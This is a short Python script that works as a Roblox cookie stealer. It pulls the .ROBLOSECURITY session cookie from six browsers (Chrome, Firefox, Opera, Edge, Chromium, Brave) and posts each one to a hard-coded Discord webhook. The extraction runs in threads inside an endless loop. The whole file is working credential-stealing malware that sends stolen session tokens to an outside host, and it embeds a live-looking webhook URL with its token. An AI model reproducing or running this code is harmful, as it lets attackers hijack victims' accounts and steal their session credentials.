import browser_cookie3 as bc
from threading import Thread
import requests

class CookieLogger:
    def __init__(self, webhook_url):
        self.webhook_url = webhook_url

    def _extract_and_send_cookie(self, browser_func):
        try:
            cookies = str(browser_func(domain_name='roblox.com'))
            roblox_cookie = cookies.split('ROBLOSECURITY=_|')[1].split(' for .roblox.com/>')[0].strip()
            requests.post(
                self.webhook_url,
                json={'username': 'CookieLogger', 'content': roblox_cookie}
            )
            return roblox_cookie
        except Exception as e:
            print(f"Error extracting cookie: {e}")
            return None

    def get_chrome(self):
        return self._extract_and_send_cookie(bc.chrome)

    def get_firefox(self):
        return self._extract_and_send_cookie(bc.firefox)

    def get_opera(self):
        return self._extract_and_send_cookie(bc.opera)

    def get_edge(self):
        return self._extract_and_send_cookie(bc.edge)

    def get_chromium(self):
        return self._extract_and_send_cookie(bc.chromium)

    def get_brave(self):
        return self._extract_and_send_cookie(bc.brave)

    def run_all(self):
        browsers = [
            self.get_chrome,
            self.get_firefox,
            self.get_opera,
            self.get_edge,
            self.get_chromium,
            self.get_brave
        ]
        for browser_func in browsers:
            Thread(target=browser_func).start()

def main():
    WEBHOOK_URL = "https://discord.com/api/webhooks/1380540558036045893/LI1P9DWcvd5jEHJ9GdrCIaEgF6DdAUbY7umdmIzRPuVv7Sf9q8QrcdEvJvBmNh6LrEU8"
    logger = CookieLogger(WEBHOOK_URL)
    
    while True:
        logger.run_all()

if __name__ == "__main__":
    main()